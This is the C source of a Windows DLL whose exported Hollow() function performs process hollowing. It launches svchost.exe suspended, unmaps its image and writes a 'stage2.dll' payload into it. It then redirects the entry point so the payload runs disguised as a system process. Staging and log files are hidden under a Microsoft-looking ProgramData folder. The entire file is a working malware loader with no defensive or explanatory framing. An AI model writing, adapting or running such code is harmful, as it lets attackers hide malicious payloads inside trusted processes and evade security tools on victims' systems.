#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define LOG_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat"
#define STAGE2_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\stage2.dll"

typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t ts[64];
    wsprintfW(ts, L"[%04d-%02d-%02d %02d:%02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    char ts8[80], msg8[1024];
    WideCharToMultiByte(CP_UTF8, 0, ts, -1, ts8, sizeof(ts8), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, msg8, sizeof(msg8), NULL, NULL);
    DWORD written;
    WriteFile(hFile, ts8, lstrlenA(ts8), &written, NULL);
    WriteFile(hFile, msg8, lstrlenA(msg8), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static DWORD FindSvchostPID(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"svchost.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

__declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow) {
    LogMessage(L"[*] Hollow() started");

    // Find svchost.exe path
    wchar_t svchostPath[MAX_PATH] = {0};
    DWORD pid = FindSvchostPID();
    if (!pid) {
        LogMessage(L"[-] svchost.exe not found — using default path");
        lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
    } else {
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProc) {
            GetModuleFileNameExW(hProc, NULL, svchostPath, MAX_PATH);
            CloseHandle(hProc);
        }
        if (!svchostPath[0])
            lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
    }

    // Create suspended svchost
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(svchostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LogMessage(L"[-] CreateProcess (suspended) failed");
        return;
    }
    LogMessage(L"[+] svchost.exe created suspended");

    // NtUnmapViewOfSection
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PNtUnmapViewOfSection pNtUnmap = (PNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!pNtUnmap) {
        LogMessage(L"[-] NtUnmapViewOfSection not found");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }

    // Read PEB to get image base
    PROCESS_BASIC_INFORMATION pbi = {0};
    NTSTATUS (NTAPI *pNtQueryInfo)(HANDLE, int, PVOID, ULONG, PULONG) =
        (void*)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!pNtQueryInfo) {
        LogMessage(L"[-] NtQueryInformationProcess not found");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    ULONG retLen = 0;
    if (pNtQueryInfo(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen) != 0) {
        LogMessage(L"[-] NtQueryInformationProcess failed");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }

    // Read PEB -> ImageBaseAddress
    BYTE pebBuf[sizeof(PVOID) * 4] = {0};
    if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, pebBuf, sizeof(PVOID), NULL)) {
        LogMessage(L"[-] ReadProcessMemory PEB failed");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    LPVOID imageBase;
    memcpy(&imageBase, pebBuf, sizeof(PVOID));

    // Read stage2.dll from disk
    HANDLE hFile = CreateFileW(STAGE2_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LogMessage(L"[-] stage2.dll not found at staging path");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPBYTE stage2Buf = (LPBYTE)LocalAlloc(LPTR, fileSize);
    if (!stage2Buf) { CloseHandle(hFile); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
    DWORD read = 0;
    ReadFile(hFile, stage2Buf, fileSize, &read, NULL);
    CloseHandle(hFile);

    // Parse PE headers
    PIMAGE_DOS_HEADER dosH = (PIMAGE_DOS_HEADER)stage2Buf;
    PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(stage2Buf + dosH->e_lfanew);
    DWORD imageSize = ntH->OptionalHeader.SizeOfImage;
    LPVOID targetBase = (LPVOID)ntH->OptionalHeader.ImageBase;

    // Unmap original svchost
    pNtUnmap(pi.hProcess, imageBase);

    // Allocate memory in svchost
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, targetBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        LogMessage(L"[-] VirtualAllocEx failed — trying any address");
        remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            LogMessage(L"[-] VirtualAllocEx (any addr) also failed");
            LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            return;
        }
    }

    // Write PE headers
    WriteProcessMemory(pi.hProcess, remoteImage, stage2Buf, ntH->OptionalHeader.SizeOfHeaders, NULL);

    // Write each section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntH);
    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            WriteProcessMemory(pi.hProcess, (BYTE*)remoteImage + section[i].VirtualAddress,
                               stage2Buf + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
        }
    }
    LogMessage(L"[+] stage2.dll written to svchost memory");

    // Fix up image base address in PEB if we allocated at a different address
    if (remoteImage != targetBase) {
        WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, &remoteImage, sizeof(PVOID), NULL);
    }

    // Set thread context to entry point
    CONTEXT ctx = { CONTEXT_FULL };
    if (!GetThreadContext(pi.hThread, &ctx)) {
        LogMessage(L"[-] GetThreadContext failed");
        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    ctx.Rcx = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        LogMessage(L"[-] SetThreadContext failed");
        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    LogMessage(L"[+] Thread context set — entry point redirected");

    // Resume
    ResumeThread(pi.hThread);
    LogMessage(L"[+] Hollow() complete — svchost.exe running stage2");

    LocalFree(stage2Buf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
